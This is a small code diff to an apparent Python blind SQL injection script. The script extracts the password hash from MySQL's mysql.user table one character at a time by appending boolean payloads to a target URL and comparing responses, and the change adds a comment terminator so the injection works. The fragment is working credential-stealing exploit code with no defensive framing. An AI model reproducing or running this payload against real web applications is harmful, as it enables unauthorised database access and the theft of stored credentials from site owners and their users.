@@ -33,7 +33,7 @@ class Sql(object):
             print '\r to %d\b\r' %i,
             for _str in self.str:
                 ascii_str=ord(_str)
-                payload=' and ascii(mid((select password from mysql.user limit 0,1),{len},1))={ascii}'.format(len=i,ascii=ascii_str)
+                payload=' and ascii(mid((select password from mysql.user limit 0,1),{len},1))={ascii} -- x'.format(len=i,ascii=ascii_str)
                 result = requests.get(self.url + payload, headers=self.headers).content
                 if result==self.html:
                     password += _str
